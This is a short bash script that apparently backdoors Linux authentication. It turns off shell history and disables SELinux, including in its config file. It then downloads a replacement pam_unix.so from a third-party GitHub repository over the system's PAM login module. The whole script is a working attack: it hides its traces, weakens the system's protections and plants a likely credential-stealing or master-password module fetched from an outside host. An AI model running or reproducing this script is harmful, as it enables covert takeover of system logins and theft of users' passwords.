#!/bin/bash
set +o history
echo "------------------------------------"
setenforce 0
chattr -i /etc/selinux/config
echo "------------------------------------"
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
echo "------------------------------------"
wget https://raw.githubusercontent.com/Pe1asguss/tes/main/pam_unix.so -O /usr/lib64/security/pam_unix.so
echo "------------------------------------"
cat /etc/selinux/config
